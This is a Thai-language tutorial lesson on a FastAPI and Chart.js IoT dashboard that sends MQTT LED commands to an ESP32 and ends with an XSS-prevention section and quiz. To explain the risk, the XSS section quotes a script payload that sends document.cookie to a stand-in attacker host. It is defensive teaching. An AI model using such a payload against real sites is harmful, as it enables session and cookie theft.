บทเรียนที่ 6: หน้าเว็บบอร์ดแสดงผลแบบตอบสนอง (Responsive Dashboard)

ในบทนี้ เราจะเสิร์ฟไฟล์ HTML/CSS/JS หน้าบ้านจากเซิร์ฟเวอร์ FastAPI, ทำระบบ REST Polling เพื่อขอรับข้อมูลเซ็นเซอร์ทุกๆ 5 วินาที, สร้างปุ่มสั่งเปิด-ปิดไฟแบบ Interactive และล็อกประตูความปลอดภัยด้วยการป้องกัน XSS

Part 1: Static Files Service in FastAPI

แทนที่ต้องรันเซิร์ฟเวอร์หน้าบ้านแยกอีกตัว เราสั่งให้ FastAPI เสิร์ฟไฟล์คงที่ (Static Files เช่น หน้าจอแดชบอร์ด) จากโฟลเดอร์ฝั่งเครื่องแม่ข่ายโดยตรงได้ง่ายๆ:

1. ติดตั้งไลบรารีรองรับ (Aiofiles สำหรับ FastAPI static):

pip install aiofiles

2. เขียนคำสั่งเมาท์โฟลเดอร์ /static ในไฟล์ main.py:

from fastapi import FastAPI
from fastapi.staticfiles import StaticFiles

app = FastAPI()

# เมาท์โฟลเดอร์ static ไปยังพาธ /
app.mount("/", StaticFiles(directory="static", html=True), name="static")

หมายเหตุ: ตัวเลือก html=True จะทำให้ FastAPI ควานหาไฟล์ index.html ในโฟลเดอร์ static และส่งเป็นหน้าแรกโดยอัตโนมัติ

Part 2: REST Polling, Time-based Filtering & Chart.js Integration

เพื่อตอบรับระบบดีไซน์สุดล้ำและฟังก์ชันการวิเคราะห์ข้อมูลที่ดีขึ้น หน้าแดชบอร์ดของเราจะใช้ไลบรารี Chart.js ในการวาดกราฟเส้นสีนีออนม่วง-ฟ้าแสดงแนวโน้มข้อมูลเซ็นเซอร์ พร้อมเพิ่มกล่อง Dropdown สำหรับกรองข้อมูลย้อนหลังตามช่วงเวลา (1 นาที, 15 นาที, 1 วัน และ 1 สัปดาห์):

1. ตัวอย่างไฟล์หน้าบ้านหลัก (static/index.html) ในธีมน้ำเงินม่วง:

Part 3: Interactive Actuator Command (MQTT Command Propagation)

เมื่อผู้ใช้คลิกปุ่ม "Blink LED" บนแดชบอร์ด หน้าเว็บจะยิง HTTP POST Request ไปที่ FastAPI Backend จากนั้นหลังบ้านจะแปลงคำสั่งและพับลิช (Publish) ข้อความ "BLINK" เข้าโบรกเกอร์ MQTT ด้วยความไวระดับมิลลิวินาที:

1. ฝั่ง Backend (main.py): จุดรับสัญญาณสั่งการทางไกล

@app.post("/api/actuators/led")
def control_led(status: str, mqtt_manager: MqttManager = Depends(get_mqtt_manager)):
    if status in ["ON", "OFF", "BLINK"]:
        # ส่งคำสั่งควบคุมไปยังบอร์ด ESP32 ผ่านหัวข้อ actuators/led
        mqtt_manager.client.publish("actuators/led", status)
        return {"status": "Success", "action": status}
    return {"status": "Error", "message": "Invalid command status"}

2. ฝั่ง Frontend (static/dashboard.js) ตัวดึงและควบคุมค่า:

let sensorChart;

// ฟังก์ชันดึงประวัติและวาดกราฟอิงตามประเภทเซ็นเซอร์และเวลากรอง
async function fetchHistoryAndRender() {
    const timeRange = document.getElementById("time-filter").value;
    const sensorName = document.getElementById("sensor-filter").value;
    
    try {
        // ดึงข้อมูลประวัติผ่าน Query API
        const response = await fetch(`/api/sensors/history?sensor=${sensorName}&range=${timeRange}`);
        const data = await response.json();
        
        // ดึงสถิติค่าสูงสุดประจำวันมาอัปเดตการ์ด
        await updateMaxStats();
        
        // แปลงข้อมูลประมวลผลเข้ากราฟ
        const labels = data.map(item => new Date(item.timestamp).toLocaleTimeString());
        const values = data.map(item => item.value);
        
        renderChart(labels, values, sensorName);
        renderTable(data);
    } catch (err) {
        console.error("Error loading dashboard data:", err);
    }
}

// อัปเดตการ์ดแสดงผลค่าสูงสุดของวันดึงจาก Backend
async function updateMaxStats() {
    try {
        const response = await fetch('/api/sensors/stats/max-today');
        const stats = await response.json();
        
        document.getElementById('max-temp').textContent = stats.temp ? `${stats.temp} °C` : '-- °C';
        document.getElementById('max-humidity').textContent = stats.humidity ? `${stats.humidity} %` : '-- %';
        document.getElementById('max-analog').textContent = stats.analog ? `${stats.analog}` : '--';
    } catch (err) {
        console.error("Error updating statistics:", err);
    }
}

// สั่ง Blink LED ไปยังบอร์ด ESP32
async function triggerBlinkLed() {
    try {
        const response = await fetch('/api/actuators/led?status=BLINK', {
            method: 'POST'
        });
        const result = await response.json();
        console.log("MQTT Command Dispatched:", result);
    } catch (err) {
        console.error("Failed to send blink command:", err);
    }
}

// ฟังก์ชันสร้าง/อัปเดตวาดกราฟเส้น Chart.js
function renderChart(labels, values, sensorLabel) {
    const ctx = document.getElementById('sensorChart').getContext('2d');
    if (sensorChart) {
        sensorChart.destroy(); // ทำลายกราฟเดิมทิ้งเพื่อป้องการทับซ้อนของ Canvas
    }
    
    sensorChart = new Chart(ctx, {
        type: 'line',
        data: {
            labels: labels,
            datasets: [{
                label: `ประวัติค่า: ${sensorLabel}`,
                data: values,
                borderColor: '#8B5CF6',           // เส้นกราฟสีม่วงนีออน
                backgroundColor: 'rgba(139, 92, 246, 0.15)', // เติมสีพื้นกราฟจางๆ
                pointBackgroundColor: '#06B6D4',  // จุดข้อมูลสีฟ้านีออน
                borderWidth: 2.5,
                tension: 0.35 // วาดเส้นแบบโค้งมนสวยงาม (Modern Smooth Curves)
            }]
        },
        options: {
            responsive: true,
            scales: {
                x: { grid: { color: 'rgba(255, 255, 255, 0.05)' } },
                y: { grid: { color: 'rgba(255, 255, 255, 0.05)' } }
            }
        }
    });
}

Part 4: XSS (Cross-Site Scripting) Prevention

ช่องโหว่ความปลอดภัยที่พบบ่อยในแดชบอร์ด IoT คือ หากมีผู้ไม่ประสงค์ดีส่ง JSON ปลอมปนโค้ด JavaScript ที่เป็นอันตรายผ่านช่องทาง MQTT (เช่น ตั้งชื่อเซ็นเซอร์ว่า <script>fetch('hacker-server.com/steal?cookie=' + document.cookie)</script>) เข้ามา

หากแดชบอร์ดหน้าบ้านแสดงผลด้วยคำสั่ง element.innerHTML = item.sensor_name เบราว์เซอร์จะเปิดประมวลผลสคริปต์นั้นทันที ทำให้ถูกโจมตี!

🛡️ วิธีป้องกัน XSS ในการเรนเดอร์ตาราง: หลีกเลี่ยงการใช้ .innerHTML กับข้อมูลดิบที่รับมาจากผู้ใช้งาน ให้หันมาสร้าง Element และผูกค่าด้วยคำสั่ง .textContent หรือ .innerText เสมอ ซึ่งเบราว์เซอร์จะล้างรหัสสคริปต์และแปลงอักขระพิเศษอย่าง < หรือ > ให้กลายเป็นข้อความธรรมดาอย่างปลอดภัย 
// 🛡️ โค้ดเรนเดอร์ตารางที่ปลอดภัย ป้องกัน XSS
function renderTable(data) {
    const tbody = document.getElementById('history-tbody');
    tbody.innerHTML = '';
    
    data.forEach(item => {
        const row = document.createElement('tr');
        
        const cellTime = document.createElement('td');
        // ใช้ textContent ปลอดภัยสูงสุด
        cellTime.textContent = new Date(item.timestamp).toLocaleString();
        
        const cellName = document.createElement('td');
        cellName.textContent = item.sensor_name;
        
        const cellVal = document.createElement('td');
        cellVal.textContent = `${item.value}`;
        
        row.appendChild(cellTime);
        row.appendChild(cellName);
        row.appendChild(cellVal);
        tbody.appendChild(row);
    });
}

🧠 ตรวจสอบความเข้าใจ (Quick Quiz)

เพราะเหตุใดเราจึงเลือกใช้คำสั่ง element.textContent = data แทนการใช้ element.innerHTML = data ในการแสดงผลค่าของเซ็นเซอร์บนแดชบอร์ด?

A) เพื่อช่วยเร่งความเร็วในการประมวลผล CSS แอนิเมชันในเบราว์เซอร์
B) เพื่อป้องกันช่องโหว่ XSS (Cross-Site Scripting) จากการประมวลผล Payload ที่ประสงค์ร้ายเป็นรหัสสคริปต์

📖 ข้อมูลอ้างอิงและศึกษาเพิ่มเติม:

  • การป้องกัน Cross-Site Scripting (XSS): OWASP XSS Attack Guide
  • การใช้งานเว็บบอร์ดวาดกราฟ: Chart.js Documentation
